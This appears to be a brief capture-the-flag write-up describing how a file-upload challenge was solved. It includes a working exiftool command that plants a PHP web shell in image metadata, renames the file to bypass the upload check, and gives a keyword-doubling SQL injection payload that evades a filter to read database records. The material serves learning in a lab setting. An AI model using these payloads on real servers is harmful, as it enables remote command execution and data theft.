1. In the remote file inclusion problem we have to upload a malicous file in the server.
2. The only place to upload a file in the server is the settings page to upload the profile picture.
3. I tried to upload php file but the server is only accepting image input file. 
4. The php file by changing the extension to jpeg is also uploaded but not accepted instead a message is shown that says the file is not image.
5. This made me understood that php code must exist within an image.
6. Exiftool is used to embed php code within a image.
7. Command used:  exiftool -DocumentName="<h1>RAZZOR<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg
8. The extension of this image.jpeg file is changed to image.php and uploaded and message poped up that "The file image.php has been uploaded.Agent RFI is successfully planted!".
9. The flag is found by doing sql injection to read the bio field of Agent RFI.
10. Sql command: ' uunionnion selselectect null,bio,null,null,null,null,null,null,null,null,null,null,null,null from student whwhereere name='Agent RFI'#
